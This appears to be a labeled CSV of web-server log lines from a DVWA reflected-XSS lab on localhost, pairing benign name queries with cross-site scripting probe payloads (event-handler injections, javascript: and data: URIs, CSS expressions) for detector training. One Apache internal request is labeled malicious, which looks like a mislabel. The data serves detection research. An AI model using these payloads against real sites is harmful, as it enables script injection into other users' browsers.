,url,malicious
13672,"127.0.0.1 - - [03/May/2021:03:08:14 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=tarjetas HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
11513,"127.0.0.1 - - [03/May/2021:03:23:10 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Nerti HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
4397,"127.0.0.1 - - [03/May/2021:03:40:19 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<x onxxx=alert(1)"" 400 0 ""-"" ""-""",1
14980,"127.0.0.1 - - [03/May/2021:02:35:09 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<IMG SRC=`javascript:javascript:alert(1)`>"" 400 0 ""-"" ""-""",1
9318,"127.0.0.1 - - [03/May/2021:03:27:44 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Ursala HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
17621,"127.0.0.1 - - [03/May/2021:03:27:41 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Tyler HTTP/1.1"" 200 1697 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
15648,"127.0.0.1 - - [03/May/2021:03:40:59 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<noframes oncut=\""alert(1)\"""" 400 0 ""-"" ""-""",1
1577,"127.0.0.1 - - [03/May/2021:03:27:44 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Uri HTTP/1.1"" 200 1697 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
1922,"127.0.0.1 - - [03/May/2021:03:40:51 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<ins oncut=\""alert(1)\"""" 400 0 ""-"" ""-""",1
3308,"127.0.0.1 - - [03/May/2021:02:35:03 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=&#x000003c; HTTP/1.1"" 400 0 ""-"" ""-""",1
15941,"127.0.0.1 - - [03/May/2021:03:41:31 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<thead id=x"" 400 0 ""-"" ""-""",1
5412,"127.0.0.1 - - [03/May/2021:03:40:53 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<legend id=x"" 400 0 ""-"" ""-""",1
1701,"127.0.0.1 - - [03/May/2021:03:40:38 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<div draggable=\""true\"""" 400 0 ""-"" ""-""",1
9208,"127.0.0.1 - - [03/May/2021:03:25:16 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Rosemonde HTTP/1.1"" 200 1700 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
6977,"127.0.0.1 - - [03/May/2021:03:14:40 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Donella HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
3719,"127.0.0.1 - - [03/May/2021:03:23:54 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Pas HTTP/1.1"" 200 1695 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
4069,"127.0.0.1 - - [03/May/2021:03:41:27 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<svg><article onload=alert(1)></article>"" 400 0 ""-"" ""-""",1
18164,"127.0.0.1 - - [03/May/2021:03:41:29 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<table onkeypress=\""alert(1)\"""" 400 0 ""-"" ""-""",1
14172,"127.0.0.1 - - [03/May/2021:02:35:13 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=http://www.simpatie.ro/index.php?page=friends&member=781339&javafunctionname=Pageclick&javapgno=2 javapgno=2"" 400 0 ""-"" ""-""",1
2431,"127.0.0.1 - - [03/May/2021:03:40:25 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<base onbeforepaste=\""alert(1)\"""" 400 0 ""-"" ""-""",1
3653,"127.0.0.1 - - [03/May/2021:03:12:29 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Cang HTTP/1.1"" 200 1696 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
18134,"127.0.0.1 - - [03/May/2021:03:23:56 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Paule HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
5305,"127.0.0.1 - - [03/May/2021:03:13:07 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Cherri HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
2010,"127.0.0.1 - - [03/May/2021:03:41:31 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<textarea onbeforecopy=alert(1)"" 400 0 ""-"" ""-""",1
12654,"127.0.0.1 - - [03/May/2021:03:41:07 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<rt onkeydown=\""alert(1)\"""" 400 0 ""-"" ""-""",1
7408,"127.0.0.1 - - [03/May/2021:03:11:24 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Azam HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
8320,"127.0.0.1 - - [03/May/2021:03:08:06 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=stephanie HTTP/1.1"" 200 1700 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
5115,"127.0.0.1 - - [03/May/2021:02:35:15 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<~/XSS STYLE=xss:expression(alert('XSS'))>"" 400 0 ""-"" ""-""",1
1770,"127.0.0.1 - - [03/May/2021:03:22:49 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Muffin HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
5962,"127.0.0.1 - - [03/May/2021:03:16:10 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Forrest HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
1906,"127.0.0.1 - - [03/May/2021:03:40:47 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<head oncopy=\""alert(1)\"""" 400 0 ""-"" ""-""",1
4473,"127.0.0.1 - - [03/May/2021:02:35:07 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<script\\x0Ctype=\""text/javascript\"">javascript:alert(1);</script> HTTP/1.1"" 200 1716 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/?name=aaa"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
13193,"127.0.0.1 - - [03/May/2021:03:09:56 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Aaren HTTP/1.1"" 200 1697 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
17926,"127.0.0.1 - - [03/May/2021:03:25:32 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Sanjeet HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
11003,"127.0.0.1 - - [03/May/2021:03:41:27 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<svg><shadow onload=alert(1)></shadow>"" 400 0 ""-"" ""-""",1
15283,"127.0.0.1 - - [03/May/2021:03:17:03 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Gussi HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
4919,"127.0.0.1 - - [03/May/2021:03:40:25 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<base onfocusout=alert(1)"" 400 0 ""-"" ""-""",1
12242,"127.0.0.1 - - [03/May/2021:03:06:54 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=leroy HTTP/1.1"" 200 1696 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
14430,"127.0.0.1 - - [03/May/2021:03:41:15 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<style>:target {color:red;}</style><slot"" 400 0 ""-"" ""-""",1
3400,"127.0.0.1 - - [03/May/2021:03:24:23 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Rachele HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
13104,"127.0.0.1 - - [03/May/2021:03:40:19 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<http://onxxx%3D1/ HTTP/1.1"" 200 1705 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
10101,"127.0.0.1 - - [03/May/2021:03:18:44 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Joell HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
3478,"127.0.0.1 - - [03/May/2021:03:20:04 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Lanie HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
10898,"127.0.0.1 - - [03/May/2021:03:41:15 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<style>:target {color:red;}</style><footer"" 400 0 ""-"" ""-""",1
14876,"127.0.0.1 - - [03/May/2021:03:40:59 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<noframes id=x"" 400 0 ""-"" ""-""",1
13015,"127.0.0.1 - - [03/May/2021:03:13:22 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Claretta HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
4881,"127.0.0.1 - - [03/May/2021:03:41:03 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<output onmouseover=\""alert(1)\"">test</output>"" 400 0 ""-"" ""-""",1
9483,"127.0.0.1 - - [03/May/2021:03:28:10 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Vonny HTTP/1.1"" 200 1697 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
15874,"127.0.0.1 - - [03/May/2021:03:20:07 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Latashia HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
13714,"127.0.0.1 - - [03/May/2021:03:20:58 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Louis-Philippe HTTP/1.1"" 200 1705 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
18104,"127.0.0.1 - - [03/May/2021:03:40:25 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<base draggable=\""true\"""" 400 0 ""-"" ""-""",1
11659,"127.0.0.1 - - [03/May/2021:03:21:11 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Mac HTTP/1.1"" 200 1697 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
1009,"127.0.0.1 - - [03/May/2021:02:35:13 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=&lt;LAYER SRC=&quot;http://ha.ckers.org/scriptlet.html&quot;&gt;&lt;/LAYER&gt;"" 400 0 ""-"" ""-""",1
6908,"127.0.0.1 - - [03/May/2021:03:40:16 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<x contenteditable"" 400 0 ""-"" ""-""",1
3440,"::1 - - [03/May/2021:03:41:27 -0400] ""OPTIONS * HTTP/1.0"" 200 126 ""-"" ""Apache/2.4.43 (Debian) (internal dummy connection)""",1
17534,"127.0.0.1 - - [03/May/2021:03:08:07 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=sumaris HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
18144,"127.0.0.1 - - [03/May/2021:02:35:11 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<P STYLE=\""behavior:url('#default#time2')\"""" 400 0 ""-"" ""-""",1
10106,"127.0.0.1 - - [03/May/2021:03:13:37 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Corina HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
14723,"127.0.0.1 - - [03/May/2021:03:16:21 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Gae HTTP/1.1"" 200 1697 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
7197,"127.0.0.1 - - [03/May/2021:03:40:30 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<center onpaste=\""alert(1)\"""" 400 0 ""-"" ""-""",1
6858,"127.0.0.1 - - [03/May/2021:03:40:18 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<x 1='1'onxxx=1"" 400 0 ""-"" ""-""",1
11499,"127.0.0.1 - - [03/May/2021:03:12:33 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Carlisle HTTP/1.1"" 200 1700 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
11386,"127.0.0.1 - - [03/May/2021:03:12:42 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Cassaundra HTTP/1.1"" 200 1701 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
6172,"127.0.0.1 - - [03/May/2021:03:11:52 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Betty-Anne HTTP/1.1"" 200 1702 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
227,"127.0.0.1 - - [03/May/2021:03:41:01 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<object draggable=\""true\"""" 400 0 ""-"" ""-""",1
10284,"127.0.0.1 - - [03/May/2021:03:16:05 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Florencia HTTP/1.1"" 200 1700 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
16442,"127.0.0.1 - - [03/May/2021:03:18:54 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Jonelle HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
4455,"127.0.0.1 - - [03/May/2021:03:40:23 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<audio draggable=\""true\"""" 400 0 ""-"" ""-""",1
8382,"127.0.0.1 - - [03/May/2021:03:24:31 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Ramona HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
12375,"127.0.0.1 - - [03/May/2021:02:35:13 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<IMG LOWSRC=\""javascript:alert('XSS')\"">"" 400 0 ""-"" ""-""",1
12689,"127.0.0.1 - - [03/May/2021:02:35:01 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<script/src=\""data&colon;text%2Fj\\u0061v\\u0061script,\\u0061lert('\\u0061')\""></script a=\\u0061"" 400 0 ""-"" ""-""",1
13348,"127.0.0.1 - - [03/May/2021:03:12:19 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Bue HTTP/1.1"" 200 1697 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
1869,"127.0.0.1 - - [03/May/2021:03:05:14 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=arrow HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
4660,"127.0.0.1 - - [03/May/2021:03:27:31 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Tressa HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
8270,"127.0.0.1 - - [03/May/2021:03:16:42 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Gianna HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
12401,"127.0.0.1 - - [03/May/2021:03:24:25 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Rainer HTTP/1.1"" 200 1696 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
13396,"127.0.0.1 - - [03/May/2021:03:40:59 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<nextid id=x"" 400 0 ""-"" ""-""",1
13106,"127.0.0.1 - - [03/May/2021:03:20:44 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Lolly HTTP/1.1"" 200 1697 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
4225,"127.0.0.1 - - [03/May/2021:03:26:23 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Sondra HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
5817,"127.0.0.1 - - [03/May/2021:03:09:56 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name= HTTP/1.1"" 200 1684 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
10147,"127.0.0.1 - - [03/May/2021:03:12:14 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Brianna HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
9619,"127.0.0.1 - - [03/May/2021:03:13:49 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Cynde HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
1301,"127.0.0.1 - - [03/May/2021:03:40:40 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<div draggable=\""true\"""" 400 0 ""-"" ""-""",1
3368,"127.0.0.1 - - [03/May/2021:03:41:31 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<time onmousemove=\""alert(1)\"">test</time>"" 400 0 ""-"" ""-""",1
1511,"127.0.0.1 - - [03/May/2021:03:41:05 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<pre onmouseover=\""alert(1)\"">test</pre>"" 400 0 ""-"" ""-""",1
9870,"127.0.0.1 - - [03/May/2021:03:40:38 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<div draggable=\""true\"""" 400 0 ""-"" ""-""",1
14571,"127.0.0.1 - - [03/May/2021:03:41:35 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<ul onmousemove=\""alert(1)\"">test</ul>"" 400 0 ""-"" ""-""",1
12603,"127.0.0.1 - - [03/May/2021:03:41:27 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<svg><del onload=alert(1)></del>"" 400 0 ""-"" ""-""",1
14227,"127.0.0.1 - - [03/May/2021:03:15:09 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Elfreda HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
5146,"127.0.0.1 - - [03/May/2021:03:26:47 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Suzanne HTTP/1.1"" 200 1701 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
14263,"127.0.0.1 - - [03/May/2021:03:41:31 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<tfoot onmouseup=\""alert(1)\"">test</tfoot>"" 400 0 ""-"" ""-""",1
14052,"127.0.0.1 - - [03/May/2021:03:12:00 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Biplab HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
11418,"127.0.0.1 - - [03/May/2021:03:41:01 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<object data=/"" 400 0 ""-"" ""-""",1
3814,"127.0.0.1 - - [03/May/2021:03:19:34 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Kazuhito HTTP/1.1"" 200 1700 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
6243,"127.0.0.1 - - [03/May/2021:03:07:28 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=plx HTTP/1.1"" 200 1697 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
1882,"127.0.0.1 - - [03/May/2021:03:24:34 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Randolph HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
7454,"127.0.0.1 - - [03/May/2021:03:13:14 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Christy HTTP/1.1"" 200 1697 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
14587,"127.0.0.1 - - [03/May/2021:03:40:50 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<img id=x"" 400 0 ""-"" ""-""",1
18105,"127.0.0.1 - - [03/May/2021:03:27:04 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Teddy HTTP/1.1"" 200 1697 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
14306,"127.0.0.1 - - [03/May/2021:03:41:15 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<style>:target {color:red;}</style><bdo"" 400 0 ""-"" ""-""",1
1612,"127.0.0.1 - - [03/May/2021:03:22:04 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Mauricio HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
6968,"127.0.0.1 - - [03/May/2021:02:34:45 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<frameset onScroll"" 400 0 ""-"" ""-""",1
594,"127.0.0.1 - - [03/May/2021:03:06:20 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=frame HTTP/1.1"" 200 1697 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
11690,"127.0.0.1 - - [03/May/2021:03:11:15 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Astrid HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
